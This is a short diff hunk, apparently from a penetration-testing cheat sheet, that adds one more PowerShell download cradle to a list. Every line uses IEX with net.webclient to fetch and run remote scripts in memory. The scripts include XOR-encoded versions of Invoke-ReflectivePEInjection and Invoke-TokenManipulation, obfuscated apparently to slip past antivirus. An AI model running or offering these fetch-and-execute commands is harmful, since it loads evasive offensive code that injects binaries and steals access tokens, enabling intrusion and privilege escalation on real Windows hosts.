@@ -29,6 +29,8 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/audit-windows.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/sharefinder.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-ReflectivePEInjection.ps1-xorencoded.ps1')
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/Invoke-TokenManipulation.ps1-xorencoded.ps1')
+
 ```
 
 # Linux
